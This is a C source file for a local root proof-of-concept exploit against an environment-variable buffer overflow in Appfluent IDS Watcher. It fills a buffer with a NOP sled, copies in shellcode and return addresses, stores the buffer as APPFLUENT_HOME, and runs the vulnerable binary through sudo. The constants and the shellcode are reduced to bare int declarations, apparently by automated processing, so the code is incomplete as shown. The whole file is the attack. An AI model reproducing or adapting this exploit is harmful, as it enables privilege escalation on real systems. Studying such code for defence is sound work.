
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;
 int DAHBUF ;
 int EXIT_FAILURE ;
 int EXIT_SUCCESS ;
 int NOP ;
 int SUDO ;
 int VULN ;
 int WOPT ;
 scalar_t__ execl (int ,int ,int ,int ,int *) ;
 int memcpy (char*,int ,int ) ;
 int memset (char*,int ,int) ;
 int perror (char*) ;
 int putenv (char*) ;
 int puts (char*) ;
 int retloc ;
 int retlok ;
 int shellcode ;
 int strlen (int ) ;
 int strncpy (char*,char*,int) ;

int main()
  {
        char env[DAHBUF+9];

        puts("\nLocal root proof of concept for Appfluent IDS Watcher environment overflow");
        puts("found and developed by c0ntex || c0ntexb@gmail.com || www.open-security.org\n");

        memset(env, NOP, DAHBUF);

        memcpy(env + 100, shellcode, strlen(shellcode));
        memcpy(env + DAHBUF, retloc, strlen(retloc));
        memcpy(env + DAHBUF + 4, retlok, strlen(retlok));
        env[DAHBUF+9] = '\0';

        strncpy(&env[0], "APPFLUENT_HOME=", 15);

        if(!env) {
             puts("barfed!");
             return(EXIT_FAILURE);
        }

        putenv(env);

        if(execl(SUDO, SUDO, VULN, WOPT, ((void*)0)) < 0) {
             perror("execle");
             return(EXIT_FAILURE);
        }

        return(EXIT_SUCCESS);
  }
